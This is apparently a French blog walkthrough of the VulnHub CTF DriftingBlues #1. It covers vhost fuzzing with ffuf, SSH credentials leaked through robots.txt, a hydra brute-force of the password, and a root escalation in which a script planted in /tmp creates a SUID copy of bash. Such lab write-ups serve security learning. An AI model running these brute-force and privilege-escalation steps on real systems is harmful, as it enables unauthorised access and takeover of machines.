# Solution du CTF DriftingBlues #1 de VulnHub

First of the name
-----------------

[DriftingBlues](https://www.vulnhub.com/entry/driftingblues-1,625/), ici le premier d'une grande lignée de VMs intentionnellement vulnérables dans l'unique but de s'amuser et apprendre, a été conçu par [tasiyanci](https://twitter.com/tasiyanci).  

```plain
Not shown: 65533 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   2048 ca:e6:d1:1f:27:f2:62:98:ef:bf:e4:38:b5:f1:67:77 (RSA) 
|   256 a8:58:99:99:f6:81:c4:c2:b4:da:44:da:9b:f3:b8:9b (ECDSA) 
|_  256 39:5b:55:2a:79:ed:c3:bf:f5:16:fd:bd:61:29:2a:b7 (ED25519) 
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) 
|_http-title: Drifting Blues Tech 
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Sur le site web on peut trouver différents noms et adresses emails : *Charles Brown*, *sheryl@driftingblues.box*, *eric@driftingblues.box*.  

On trouve aussi dans la page le commentaire HTML encodé en base64 :  

```html
<!-- L25vdGVmb3JraW5nZmlzaC50eHQ= -->
```

Ce qui se décode en : */noteforkingfish.txt*  

Okaaaaaaaayyyyyyyy
------------------

Le path cité nous amène sur une page remplie de *Ook!*, *Ook?* et autres *Ook.* Connaissant déjà quelques langages de programmation ésotériques j'ai tout de suite saisi la référence mais une recherche google aurait sans doute amené les plus dubitatifs sur une explication.  

Le site *dcode.fr* dispose [d'un interpréteur](https://www.dcode.fr/langage-ook) et l'exécution du script produit l'affichage suivant :  

> my man, i know you are new but you should know how to use host file to reach our secret location. -eric

Voyons un peu les virtual hosts qui retournent une réponse différente de celle par défaut (à savoir ici une taille différente de 7710 octets) :  

```plain
$ ffuf -w /fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -u http://192.168.56.6/ -H "Host: FUZZ.driftingblues.box" -fs 7710 

        /'___\  /'___\           /'___\        
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\       
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/       
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        

       v1.3.1 
________________________________________________ 

 :: Method           : GET 
 :: URL              : http://192.168.56.6/ 
 :: Wordlist         : FUZZ: /fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt 
 :: Header           : Host: FUZZ.driftingblues.box 
 :: Follow redirects : false 
 :: Calibration      : false 
 :: Timeout          : 10 
 :: Threads          : 40 
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 
 :: Filter           : Response size: 7710 
________________________________________________ 

test                    [Status: 200, Size: 24, Words: 1, Lines: 6] 
:: Progress: [50000/50000] :: Job [1/1] :: 2862 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
```

Une fois sur le site on obtient juste le message *work in progress -eric*.  

Après beaucoup d'énumération je trouve sur ce vhost un fichier... *robots.txt*. Comme quoi un simple appel à Nuclei m'aurait fait gagné du temps, à se rappeller lors de la prochaine découverte de vhost.  

Le plus intéressant est une URL interdite qui mentionne un accès SSH :  

```plain
User-agent: *
Disallow: /ssh_cred.txt
Allow: /never
Allow: /never/gonna
Allow: /never/gonna/give
Allow: /never/gonna/give/up
```

Le message :  

```plain
we can use ssh password in case of emergency. it was "1mw4ckyyucky".

sheryl once told me that she added a number to the end of the password.

-db
```

C'est toujours un plaisir de résoudre un problème avec une ligne de Python :  

```plain
$ python3 -c "[print(f'1mw4ckyyucky{i}') for i in range(10)]" > pass.txt
$ hydra -L users.txt -P pass.txt ssh://192.168.56.6
--- snip ---
[22][ssh] host: 192.168.56.6   login: eric   password: 1mw4ckyyucky6
```

Let's root
----------

Ce compte dispose du premier flag mais n'a aucune règle sudo associée. L'outil d'énumération de failles et de mauvaises configurations locales LinPEAS ne retourne rien qui vaille...  

En revanche on peut monitorer les process avec [pspy](https://github.com/DominicBreuker/pspy) et là on a quelque chose de plus intéressant :  

```plain
2022/01/19 01:25:01 CMD: UID=0    PID=20942  | /usr/bin/zip -r -0 /tmp/backup.zip /var/www/  
2022/01/19 01:25:01 CMD: UID=0    PID=20941  | /bin/sh /var/backups/backup.sh  
2022/01/19 01:25:01 CMD: UID=0    PID=20940  | /bin/sh -c /bin/sh /var/backups/backup.sh  
2022/01/19 01:25:01 CMD: UID=0    PID=20939  | /usr/sbin/CRON -f  
2022/01/19 01:25:01 CMD: UID=0    PID=20944  | sudo /tmp/emergency
```

Le dernier script mentionné est manquant :  

```plain
eric@driftingblues:~$ file /tmp/emergency 
/tmp/emergency: cannot open `/tmp/emergency' (No such file or directory)
```

Et comme il est dans */tmp* on peut le créer pour y placer par exemple le contenu suivant :  

```bash
#!/bin/bash 
cp /bin/bash /tmp/g0tr00t 
chmod 4755 /tmp/g0tr00t
```

On attend que la tâche CRON s'exécute et on a notre shell :  

```plain
eric@driftingblues:/tmp$ ./g0tr00t -p 
g0tr00t-4.3# id 
uid=1001(eric) gid=1001(eric) euid=0(root) groups=1001(eric) 
g0tr00t-4.3# cd /root 
g0tr00t-4.3# ls 
root.txt 
g0tr00t-4.3# cat root.txt  
flag 2/2 
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ 
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ 
░░░░█░░░░░░░░░░░░░░░░░░░░░░█ 
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ 
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ 
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ 
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ 
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ 
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ 
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ 
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ 
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ 
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ 
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ 
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ 
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ 
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ 
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ 
░░█░░▌░█░░█░░█░░░█░░█░░█ 
░░█░░▀▀░░██░░█░░░█░░█░░█ 
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ 

congratulations! 
thank you for playing
```

Un CTF du type jeu de pistes mais suffisamment logique pour être agréable.

*Published January 19 2022 at 20:10*